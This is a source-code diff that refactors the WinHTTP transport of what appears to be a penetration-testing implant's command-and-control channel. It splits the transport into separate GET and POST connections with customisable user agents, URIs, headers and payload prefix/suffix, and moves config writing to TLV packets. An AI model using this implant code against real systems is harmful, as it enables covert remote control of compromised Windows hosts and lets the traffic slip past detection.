@@ -27,8 +27,16 @@ static HINTERNET get_request_winhttp(HttpTransportContext *ctx, BOOL isGet, cons
 		dprintf("[%s] Setting secure flag..", direction);
 	}
 
-	vdprintf("[%s] opening request on connection %x to %S", direction, ctx->connection, ctx->uri);
-	hReq = WinHttpOpenRequest(ctx->connection, isGet ? L"GET" : L"POST", ctx->uri, NULL, NULL, NULL, flags);
+	HttpConnection* conn = isGet ? &ctx->get_connection : &ctx->post_connection;
+	PWCHAR uri = ctx->default_options.uri;
+	if (conn->options.uri)
+	{
+		// TODO OJ: include the default URI/UUID in here somehow?
+		uri = conn->options.uri;
+	}
+
+	vdprintf("[%s] opening request on connection %x to %S", direction, conn->connection, uri);
+	hReq = WinHttpOpenRequest(conn->connection, isGet ? L"GET" : L"POST", uri, NULL, NULL, NULL, flags);
 
 	if (hReq == NULL)
 	{
@@ -75,7 +83,7 @@ static HINTERNET get_request_winhttp(HttpTransportContext *ctx, BOOL isGet, cons
 					}
 					autoProxyOpts.fAutoLogonIfChallenged = TRUE;
 
-					if (WinHttpGetProxyForUrl(ctx->internet, ctx->url, &autoProxyOpts, &proxyInfo))
+					if (WinHttpGetProxyForUrl(conn->internet, ctx->url, &autoProxyOpts, &proxyInfo))
 					{
 						ctx->proxy_for_url = malloc(sizeof(WINHTTP_PROXY_INFO));
 						memcpy(ctx->proxy_for_url, &proxyInfo, sizeof(WINHTTP_PROXY_INFO));
@@ -185,16 +193,25 @@ static BOOL read_response_winhttp(HANDLE hReq, LPVOID buffer, DWORD bytesToRead,
  * @brief Wrapper around WinHTTP-specific sending functionality.
  * @param ctx Pointer to the current HTTP transport context.
  * @param hReq HTTP request handle.
+ * @param isGet Specifies if this request is a GET request (compared to POST).
  * @param buffer Pointer to the buffer to receive the data.
  * @param size Buffer size.
  * @return An indication of the result of sending the request.
  */
-static BOOL send_request_winhttp(HttpTransportContext* ctx, HANDLE hReq, LPVOID buffer, DWORD size)
+static BOOL send_request_winhttp(HttpTransportContext* ctx, HANDLE hReq, BOOL isGet, LPVOID buffer, DWORD size)
 {
-	if (ctx->custom_headers)
+	PWSTR headers = ctx->default_options.other_headers;
+	HttpConnection* conn = isGet ? &ctx->get_connection : &ctx->post_connection;
+
+	if (conn->options.other_headers)
 	{
-		dprintf("[WINHTTP] Sending with custom headers: %S", ctx->custom_headers);
-		return WinHttpSendRequest(hReq, ctx->custom_headers, -1L, buffer, size, size, 0);
+		headers = conn->options.other_headers;
+	}
+
+	if (headers)
+	{
+		dprintf("[WINHTTP] Sending with custom headers: %S", headers);
+		return WinHttpSendRequest(hReq, headers, -1L, buffer, size, size, 0);
 	}
 
 	return WinHttpSendRequest(hReq, NULL, 0, buffer, size, size, 0);
@@ -305,7 +322,7 @@ static DWORD packet_transmit_http(Remote *remote, LPBYTE rawPacket, DWORD rawPac
 			BREAK_ON_ERROR("[PACKET TRANSMIT HTTP] Failed create_req");
 		}
 
-		res = ctx->send_req(ctx, hReq, rawPacket, rawPacketLength);
+		res = ctx->send_req(ctx, hReq, FALSE, rawPacket, rawPacketLength);
 		if (!res)
 		{
 			BREAK_ON_ERROR("[PACKET TRANSMIT HTTP] Failed send_req");
@@ -351,7 +368,7 @@ static DWORD packet_receive_http(Remote *remote, Packet **packet)
 	}
 
 	vdprintf("[PACKET RECEIVE HTTP] sending GET");
-	hRes = ctx->send_req(ctx, hReq, NULL, 0);
+	hRes = ctx->send_req(ctx, hReq, TRUE, NULL, 0);
 
 	if (!hRes)
 	{
@@ -531,6 +548,40 @@ out:
 	return res;
 }
 
+static DWORD server_init_connection(HttpTransportContext* ctx, HttpConnection* conn, PWSTR host, INTERNET_PORT port)
+{
+	// configure proxy
+	if (ctx->proxy)
+	{
+		dprintf("[DISPATCH] Configuring with proxy: %S", ctx->proxy);
+		conn->internet = WinHttpOpen(conn->options.ua, WINHTTP_ACCESS_TYPE_NAMED_PROXY, ctx->proxy, WINHTTP_NO_PROXY_BYPASS, 0);
+	}
+	else
+	{
+		conn->internet = WinHttpOpen(conn->options.ua, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+	}
+
+	if (!conn->internet)
+	{
+		dprintf("[DISPATCH] Failed WinHttpOpen: %d", GetLastError());
+		return GetLastError();
+	}
+
+	dprintf("[DISPATCH] Configured hInternet: 0x%.8x", conn->internet);
+
+
+	// Allocate the connection handle
+	conn->connection = WinHttpConnect(conn->internet, host, port, 0);
+	if (!conn->connection)
+	{
+		dprintf("[DISPATCH] Failed WinHttpConnect: %d", GetLastError());
+		return GetLastError();
+	}
+
+	dprintf("[DISPATCH] Configured hConnection: 0x%.8x", conn->connection);
+
+	return ERROR_SUCCESS;
+}
 
 /*!
  * @brief Initialise the HTTP(S) connection.
@@ -539,31 +590,12 @@ out:
  */
 static DWORD server_init_winhttp(Transport* transport)
 {
+	dprintf("[WINHTTP] Initialising ...");
+
 	URL_COMPONENTS bits;
 	wchar_t tmpHostName[URL_SIZE];
 	wchar_t tmpUrlPath[URL_SIZE];
 	HttpTransportContext* ctx = (HttpTransportContext*)transport->ctx;
-
-	dprintf("[WINHTTP] Initialising ...");
-
-	// configure proxy
-	if (ctx->proxy)
-	{
-		dprintf("[DISPATCH] Configuring with proxy: %S", ctx->proxy);
-		ctx->internet = WinHttpOpen(ctx->ua, WINHTTP_ACCESS_TYPE_NAMED_PROXY, ctx->proxy, WINHTTP_NO_PROXY_BYPASS, 0);
-	}
-	else
-	{
-		ctx->internet = WinHttpOpen(ctx->ua, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-	}
-
-	if (!ctx->internet)
-	{
-		dprintf("[DISPATCH] Failed WinHttpOpen: %d", GetLastError());
-		return GetLastError();
-	}
-
-	dprintf("[DISPATCH] Configured hInternet: 0x%.8x", ctx->internet);
 
 	// The InternetCrackUrl method was poorly designed...
 	ZeroMemory(tmpHostName, sizeof(tmpHostName));
@@ -581,24 +613,35 @@ static DWORD server_init_winhttp(Transport* transport)
 	dprintf("[DISPATCH] About to crack URL: %S", transport->url);
 	WinHttpCrackUrl(transport->url, 0, 0, &bits);
 
-	SAFE_FREE(ctx->uri);
-	ctx->uri = _wcsdup(tmpUrlPath);
-	transport->comms_last_packet = current_unix_timestamp();
+	SAFE_FREE(ctx->default_options.uri);
+	ctx->default_options.uri = _wcsdup(tmpUrlPath);
 
-	dprintf("[DISPATCH] Configured URI: %S", ctx->uri);
+	dprintf("[DISPATCH] Configured URI: %S", ctx->default_options.uri);
 	dprintf("[DISPATCH] Host: %S Port: %u", tmpHostName, bits.nPort);
 
-	// Allocate the connection handle
-	ctx->connection = WinHttpConnect(ctx->internet, tmpHostName, bits.nPort, 0);
-	if (!ctx->connection)
+	DWORD result = server_init_connection(ctx, &ctx->get_connection, tmpHostName, bits.nPort);
+	result = server_init_connection(ctx, &ctx->post_connection, tmpHostName, bits.nPort);
+
+	transport->comms_last_packet = current_unix_timestamp();
+
+	return result;
+}
+
+static void close_connection(HttpTransportContext* ctx, HttpConnection* conn)
+{
+	if (conn != NULL)
 	{
-		dprintf("[DISPATCH] Failed WinHttpConnect: %d", GetLastError());
-		return GetLastError();
+		if (conn->connection != NULL)
+		{
+			ctx->close_req(conn->connection);
+			conn->connection = NULL;
+		}
+		if (conn->internet != NULL)
+		{
+			ctx->close_req(conn->internet);
+			conn->internet = NULL;
+		}
 	}
-
-	dprintf("[DISPATCH] Configured hConnection: 0x%.8x", ctx->connection);
-
-	return ERROR_SUCCESS;
 }
 
 /*!
@@ -612,17 +655,8 @@ static DWORD server_deinit_http(Transport* transport)
 
 	dprintf("[HTTP] Deinitialising ...");
 
-	if (ctx->connection)
-	{
-		ctx->close_req(ctx->connection);
-		ctx->connection = NULL;
-	}
-
-	if (ctx->internet)
-	{
-		ctx->close_req(ctx->internet);
-		ctx->internet = NULL;
-	}
+	close_connection(ctx, &ctx->get_connection);
+	close_connection(ctx, &ctx->post_connection);
 
 	// have we had issues that require us to move?
 	if (ctx->move_to_wininet)
@@ -744,11 +778,11 @@ static DWORD server_dispatch_http(Remote* remote, THREAD* dispatchThread)
 				if (ctx->new_uri != NULL)
 				{
 					dprintf("[DISPATCH] Recieved hot-patched URL for stageless: %S", ctx->new_uri);
-					dprintf("[DISPATCH] Old URI is: %S", ctx->uri);
+					dprintf("[DISPATCH] Old URI is: %S", ctx->default_options.uri);
 					dprintf("[DISPATCH] Old URL is: %S", transport->url);
 
 					// if the new URI needs more space, let's realloc space for the new URL now
-					int diff = (int)wcslen(ctx->new_uri) - (int)wcslen(ctx->uri);
+					int diff = (int)wcslen(ctx->new_uri) - (int)wcslen(ctx->default_options.uri);
 					if (diff > 0)
 					{
 						dprintf("[DISPATCH] New URI is bigger by %d", diff);
@@ -787,12 +821,12 @@ static DWORD server_dispatch_http(Remote* remote, THREAD* dispatchThread)
 					dprintf("[DISPATCH] Pointer is at: %p -> %S", csr, csr);
 
 					// patch in the new URI
-					wcscpy_s(csr, wcslen(diff > 0 ? ctx->new_uri : ctx->uri) + 1, ctx->new_uri);
+					wcscpy_s(csr, wcslen(diff > 0 ? ctx->new_uri : ctx->default_options.uri) + 1, ctx->new_uri);
 					dprintf("[DISPATCH] New URL is: %S", transport->url);
 
 					// clean up
-					SAFE_FREE(ctx->uri);
-					ctx->uri = ctx->new_uri;
+					SAFE_FREE(ctx->default_options.uri);
+					ctx->default_options.uri = ctx->new_uri;
 					ctx->new_uri = NULL;
 				}
 			}
@@ -804,6 +838,17 @@ static DWORD server_dispatch_http(Remote* remote, THREAD* dispatchThread)
 	}
 
 	return result;
+}
+
+static void destroy_options(HttpRequestOptions* options)
+{
+	SAFE_FREE(options->ua);
+	SAFE_FREE(options->uri);
+	SAFE_FREE(options->other_headers);
+	SAFE_FREE(options->payload_prefix);
+	SAFE_FREE(options->payload_suffix);
+	SAFE_FREE(options->referrer);
+	SAFE_FREE(options->accept_types);
 }
 
 /*!
@@ -824,9 +869,11 @@ static void transport_destroy_http(Transport* transport)
 			SAFE_FREE(ctx->proxy);
 			SAFE_FREE(ctx->proxy_pass);
 			SAFE_FREE(ctx->proxy_user);
-			SAFE_FREE(ctx->ua);
-			SAFE_FREE(ctx->uri);
-			SAFE_FREE(ctx->custom_headers);
+
+			destroy_options(&ctx->post_connection.options);
+			destroy_options(&ctx->get_connection.options);
+			destroy_options(&ctx->default_options);
+
 			if (ctx->proxy_for_url)
 			{
 				WINHTTP_PROXY_INFO* proxyInfo = (WINHTTP_PROXY_INFO*)ctx->proxy_for_url;
@@ -847,58 +894,70 @@ static void transport_destroy_http(Transport* transport)
 	}
 }
 
-void transport_write_http_config(Transport* transport, Packet* packet, Tlv* configTlv)
+void transport_write_http_config(Transport* transport, Packet* configPacket)
 {
-#ifdef FJDKLS
+	Packet* c2Packet = packet_create_group();
+	packet_add_tlv_wstring(c2Packet, TLV_TYPE_C2_URL, transport->url);
+	packet_add_tlv_uint(c2Packet, TLV_TYPE_C2_COMM_TIMEOUT, transport->timeouts.comms);
+	packet_add_tlv_uint(c2Packet, TLV_TYPE_C2_RETRY_WAIT, transport->timeouts.retry_wait);
+	packet_add_tlv_uint(c2Packet, TLV_TYPE_C2_RETRY_TOTAL, transport->timeouts.retry_total);
+
+	// TODO OJ - fill this in
+
+#if FALSE
 	HttpTransportContext* ctx = (HttpTransportContext*)transport->ctx;
-
-	dprintf("[HTTP CONF] Writing timeouts");
-	config->common.comms_timeout = transport->timeouts.comms;
-	config->common.retry_total = transport->timeouts.retry_total;
-	config->common.retry_wait = transport->timeouts.retry_wait;
-	wcsncpy(config->common.url, transport->url, URL_SIZE);
-
 	if (ctx->ua)
 	{
-		dprintf("[HTTP CONF] Writing UA");
-		wcsncpy(config->ua, ctx->ua, UA_SIZE);
+		packet_add_tlv_wstring(c2Packet, TLV_TYPE_C2_UA, ctx->ua);
 	}
-
-	if (ctx->cert_hash)
-	{
-		dprintf("[HTTP CONF] Writing cert hash");
-		memcpy(config->ssl_cert_hash, ctx->cert_hash, CERT_HASH_SIZE);
-	}
-
 	if (ctx->proxy)
 	{
-		dprintf("[HTTP CONF] Writing proxy");
-		wcsncpy(config->proxy.hostname, ctx->proxy, PROXY_HOST_SIZE);
+		packet_add_tlv_wstring(c2Packet, TLV_TYPE_C2_PROXY_HOST, ctx->proxy);
 	}
-
 	if (ctx->proxy_user)
 	{
-		dprintf("[HTTP CONF] Writing user");
-		wcsncpy(config->proxy.username, ctx->proxy_user, PROXY_USER_SIZE);
+		packet_add_tlv_wstring(c2Packet, TLV_TYPE_C2_PROXY_USER, ctx->proxy_user);
 	}
-
 	if (ctx->proxy_pass)
 	{
-		dprintf("[HTTP CONF] Writing pass");
-		wcsncpy(config->proxy.password, ctx->proxy_pass, PROXY_PASS_SIZE);
+		packet_add_tlv_wstring(c2Packet, TLV_TYPE_C2_PROXY_PASS, ctx->proxy_pass);
 	}
-
-
-	if (ctx->custom_headers)
+	if (ctx->other_headers)
 	{
-		dprintf("[HTTP CONF] Writing custom headers");
-		// let's hope they've allocated the right amount of space based on what we told them
-		// in transport_get_config_size_http
-		wcscpy(config->custom_headers, ctx->custom_headers);
+		packet_add_tlv_wstring(c2Packet, TLV_TYPE_C2_HEADERS, ctx->other_headers);
+	}
+	if (ctx->cert_hash)
+	{
+		packet_add_tlv_raw(c2Packet, TLV_TYPE_C2_CERT_HASH, ctx->cert_hash, CERT_HASH_SIZE);
 	}
 
-	dprintf("[HTTP CONF] Done.");
+	// TODO: OJ - add the get/post munging prefixes/suffixes
 #endif
+
+	packet_add_group(configPacket, TLV_TYPE_C2, c2Packet);
+}
+
+BOOL get_http_options_from_tlv(Packet* packet, Tlv* optionsTlv, HttpRequestOptions* targetOptions)
+{
+	targetOptions->uri = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_URI, NULL);
+	targetOptions->other_headers = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_OTHER_HEADERS, NULL);
+	targetOptions->payload_prefix = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_PREFIX, NULL);
+	targetOptions->payload_suffix = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_SUFFIX, NULL);
+	targetOptions->referrer = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_REFERRER, NULL);
+	targetOptions->payload_skip_count = packet_get_tlv_group_entry_value_uint(packet, optionsTlv, TLV_TYPE_C2_SKIP_COUNT);
+	targetOptions->encode_flags = packet_get_tlv_group_entry_value_uint(packet, optionsTlv, TLV_TYPE_C2_ENC);
+
+	return TRUE;
+}
+
+BOOL get_http_options_from_config(Packet* packet, Tlv* c2Tlv, UINT tlvType, HttpRequestOptions* targetOptions)
+{
+	Tlv optionsTlv = { 0 };
+	if (packet_get_tlv_group_entry(packet, c2Tlv, tlvType, &optionsTlv) == ERROR_SUCCESS)
+	{
+		return get_http_options_from_tlv(packet, &optionsTlv, targetOptions);
+	}
+	return FALSE;
 }
 
 /*!
@@ -920,9 +979,6 @@ Transport* transport_create_http(Packet* packet, Tlv* c2Tlv)
 	memset(transport, 0, sizeof(Transport));
 	memset(ctx, 0, sizeof(HttpTransportContext));
 
-	ctx->ua = packet_get_tlv_group_entry_value_wstring(packet, c2Tlv, TLV_TYPE_C2_UA, NULL);
-	dprintf("[TRANS HTTP] Given ua: %S", ctx->ua);
-
 	ctx->proxy = packet_get_tlv_group_entry_value_wstring(packet, c2Tlv, TLV_TYPE_C2_PROXY_HOST, NULL);
 	dprintf("[TRANS HTTP] Given proxy user: %S", ctx->proxy);
 
@@ -931,8 +987,6 @@ Transport* transport_create_http(Packet* packet, Tlv* c2Tlv)
 
 	ctx->proxy_pass = packet_get_tlv_group_entry_value_wstring(packet, c2Tlv, TLV_TYPE_C2_PROXY_PASS, NULL);
 	ctx->ssl = wcsncmp(url, L"https", 5) == 0;
-
-	ctx->custom_headers = packet_get_tlv_group_entry_value_wstring(packet, c2Tlv, TLV_TYPE_C2_HEADER, NULL);
 
 	// only apply the cert hash if we're given one and it's not the global value
 	LPBYTE certHash = packet_get_tlv_group_entry_value_raw(packet, c2Tlv, TLV_TYPE_C2_CERT_HASH, NULL);
@@ -953,6 +1007,13 @@ Transport* transport_create_http(Packet* packet, Tlv* c2Tlv)
 		}
 	}
 
+	// default http parameters/options
+	get_http_options_from_tlv(packet, c2Tlv, &ctx->default_options);
+
+	// now do the GET/POST specific stuff
+	get_http_options_from_config(packet, c2Tlv, TLV_TYPE_C2_GET, &ctx->get_connection.options);
+	get_http_options_from_config(packet, c2Tlv, TLV_TYPE_C2_POST, &ctx->post_connection.options);
+
 	ctx->create_req = get_request_winhttp;
 	ctx->send_req = send_request_winhttp;
 	ctx->close_req = close_request_winhttp;
@@ -972,6 +1033,8 @@ Transport* transport_create_http(Packet* packet, Tlv* c2Tlv)
 	transport->transport_destroy = transport_destroy_http;
 	transport->ctx = ctx;
 	transport->comms_last_packet = current_unix_timestamp();
+	transport->write_config = transport_write_http_config;
 
 	return transport;
 }
+
